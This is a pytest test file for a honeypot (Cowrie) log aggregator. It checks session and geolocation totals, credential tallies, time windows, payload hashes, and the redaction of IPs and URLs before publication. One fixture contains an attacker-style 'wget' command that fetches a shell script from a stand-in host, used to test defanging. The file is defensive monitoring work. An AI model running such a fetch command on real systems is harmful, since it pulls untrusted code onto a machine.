import ipaddress
import json

from honeypot_collector.aggregate import HOURLY_BUCKETS, Aggregator

from .conftest import END, ev, session_events

SHA_A = "a" * 64
SHA_B = "b" * 64


def agg(geo, events, **kw):
    return Aggregator(geo=geo, end=END, days=kw.pop("days", 7), **kw).add_all(events)


def test_sessions_protocols_and_geo(geo):
    events = (
        session_events("1.1.1.10", "s1", "2026-10-25T10:00:00Z")
        + session_events("1.1.1.11", "s2", "2026-10-25T10:05:00Z", protocol="telnet")
        + session_events("2.2.2.20", "s3", "2026-10-25T11:00:00Z")
        + session_events("9.9.9.9", "s4", "2026-10-25T11:30:00Z")
    )
    doc = agg(geo, events).result()
    t = doc["totals"]
    assert t["sessions"] == 4
    assert (t["ssh_sessions"], t["telnet_sessions"]) == (3, 1)
    assert t["unique_sources"] == 4
    assert t["countries"] == 2  # Unknown (ZZ) is listed but not counted as a country
    assert doc["countries"][0] == {"code": "CN", "name": "China", "sessions": 2}
    assert {"code": "ZZ", "name": "Unknown", "sessions": 1} in doc["countries"]
    assert doc["asns"][0] == {"asn": 4134, "org": "CHINANET-BACKBONE", "sessions": 2}


def test_logins_and_credentials(geo):
    events = session_events(
        "1.1.1.10", "s1", "2026-10-25T10:00:00Z",
        logins=[("root", "123456", False), ("root", "admin", False), ("admin", "", True)],
    ) + session_events("2.2.2.2", "s2", "2026-10-25T10:01:00Z",
                       logins=[("root", "123456", False)])
    doc = agg(geo, events).result()
    assert doc["totals"]["login_attempts"] == 4
    assert doc["totals"]["login_successes"] == 1
    assert doc["usernames"][0] == {"value": "root", "count": 3}
    assert doc["passwords"][0] == {"value": "123456", "count": 2}
    assert {"value": "(empty)", "count": 1} in doc["passwords"]
    assert doc["credentials"][0] == {"username": "root", "password": "123456", "count": 2}


def test_window_excludes_old_and_future_events(geo):
    events = (
        session_events("1.1.1.1", "old", "2026-10-01T00:00:00Z")
        + session_events("1.1.1.2", "in", "2026-10-24T00:00:00Z")
        + session_events("1.1.1.3", "future", "2026-10-26T00:00:00Z")
    )
    a = agg(geo, events, days=7)
    doc = a.result()
    assert doc["totals"]["sessions"] == 1
    assert doc["window"]["first_event"] == "2026-10-24T00:00:00Z"
    assert doc["window"]["start"] == "2026-10-18T12:30:00Z"


def test_events_without_valid_timestamp_are_ignored(geo):
    events = [ev("cowrie.session.connect", "garbage"), {"eventid": "cowrie.session.connect"}]
    assert agg(geo, events).result()["totals"]["sessions"] == 0


def test_exclude_cidr_drops_admin_traffic(geo):
    events = session_events(
        "2.2.2.20", "admin", "2026-10-25T10:00:00Z",
        logins=[("saafir", "my-real-password", False)], commands=["ls"],
    ) + session_events("1.1.1.10", "bot", "2026-10-25T10:00:00Z")
    a = agg(geo, events, exclude=[ipaddress.ip_network("2.2.2.0/24")])
    doc = a.result()
    assert doc["totals"]["sessions"] == 1
    assert doc["totals"]["login_attempts"] == 0
    assert "my-real-password" not in json.dumps(doc)
    assert a.events_excluded == 4


def test_hourly_is_zero_filled_week_ending_at_window_end(geo):
    events = session_events("1.1.1.1", "s1", "2026-10-25T12:10:00Z",
                            logins=[("root", "x", False)])
    events += session_events("1.1.1.1", "s2", "2026-10-25T09:59:59Z")
    doc = agg(geo, events).result()
    hourly = doc["hourly"]
    assert len(hourly) == HOURLY_BUCKETS
    assert hourly[-1] == {"t": "2026-10-25T12:00:00Z", "sessions": 1, "logins": 1}
    assert hourly[-4] == {"t": "2026-10-25T09:00:00Z", "sessions": 1, "logins": 0}
    assert sum(h["sessions"] for h in hourly) == 2
    assert hourly[0]["t"] == "2026-10-18T13:00:00Z"


def test_daily_covers_every_day_in_window(geo):
    doc = agg(geo, session_events("1.1.1.1", "s1", "2026-10-20T08:00:00Z")).result()
    days = [d["d"] for d in doc["daily"]]
    assert days[0] == "2026-10-18" and days[-1] == "2026-10-25"
    assert len(days) == 8
    assert {"d": "2026-10-20", "sessions": 1} in doc["daily"]


def test_commands_are_sanitised_counted_and_recent_deduplicated(geo):
    events = (
        session_events("1.1.1.10", "s1", "2026-10-25T10:00:00Z",
                       commands=["uname -a", "wget http://203.0.113.9/x.sh"])
        + session_events("2.2.2.20", "s2", "2026-10-25T11:00:00Z", commands=["uname   -a"])
    )
    doc = agg(geo, events).result()
    assert doc["commands"][0] == {"value": "uname -a", "count": 2}
    assert {"value": "wget hxxp://203[.]0[.]113[.]x/x.sh", "count": 1} in doc["commands"]
    recent = doc["recent_commands"]
    assert len(recent) == 2
    assert recent[0] == {"t": "2026-10-25T11:00:00Z", "cmd": "uname -a", "country": "US"}


def test_recent_commands_capped(geo):
    cmds = [f"echo {i}" for i in range(40)]
    doc = Aggregator(geo=geo, end=END, recent_n=5).add_all(
        session_events("1.1.1.1", "s", "2026-10-25T10:00:00Z", commands=cmds)
    ).result()
    assert len(doc["recent_commands"]) == 5


def test_payload_hashes_only_valid_sha256(geo):
    events = [
        ev("cowrie.session.file_download", "2026-10-25T10:00:00Z", shasum=SHA_A,
           url="http://203.0.113.9/x", outfile="var/lib/cowrie/downloads/" + SHA_A),
        ev("cowrie.session.file_upload", "2026-10-25T11:00:00Z", shasum=SHA_A.upper(),
           filename="x.bin"),
        ev("cowrie.session.file_upload", "2026-10-25T09:00:00Z", shasum=SHA_B),
        ev("cowrie.session.file_upload", "2026-10-25T09:00:00Z", shasum="not-a-hash"),
        ev("cowrie.session.file_download.failed", "2026-10-25T09:00:00Z",
           url="http://203.0.113.9/y"),
    ]
    doc = agg(geo, events).result()
    assert doc["totals"]["payloads"] == 2
    assert doc["totals"]["downloads_blocked"] == 1
    first = doc["payloads"][0]
    assert first == {
        "sha256": SHA_A, "count": 2, "via": ["download", "upload"],
        "first_seen": "2026-10-25T10:00:00Z", "last_seen": "2026-10-25T11:00:00Z",
    }
    text = json.dumps(doc)
    assert "203.0.113" not in text  # download URLs are never published
    assert "x.bin" not in text  # nor file names


def test_output_never_contains_full_ips_or_session_ids(geo):
    events = session_events("1.1.1.10", "deadbeef0001", "2026-10-25T10:00:00Z",
                            logins=[("root", "1.2.3.4", True)],
                            commands=["echo 1.1.1.10 > /tmp/me"])
    events.append(ev("cowrie.client.version", "2026-10-25T10:00:00Z", "1.1.1.10",
                     "deadbeef0001", version="SSH-2.0-scanner 10.0.0.1"))
    doc = agg(geo, events).result(publish_prefixes=True)
    text = json.dumps(doc)
    assert "1.1.1.10" not in text
    assert "1.2.3.4" not in text
    assert "10.0.0.1" not in text
    assert "deadbeef0001" not in text
    assert doc["prefixes"] == [{"prefix": "1.1.1.0/24", "sessions": 1}]


def test_prefixes_absent_by_default(geo):
    doc = agg(geo, session_events("1.1.1.1", "s", "2026-10-25T10:00:00Z")).result()
    assert "prefixes" not in doc


def test_top_lists_are_order_independent(geo):
    a = session_events("1.1.1.1", "s1", "2026-10-25T10:00:00Z",
                       logins=[("b", "x", False), ("a", "x", False)])
    b = list(reversed(a))
    assert agg(geo, a).result()["usernames"] == agg(geo, b).result()["usernames"]
    assert agg(geo, a).result()["usernames"][0]["value"] == "a"


def test_client_versions(geo):
    events = [ev("cowrie.client.version", "2026-10-25T10:00:00Z", version="SSH-2.0-Go")] * 3
    doc = agg(geo, events).result()
    assert doc["client_versions"] == [{"value": "SSH-2.0-Go", "count": 3}]
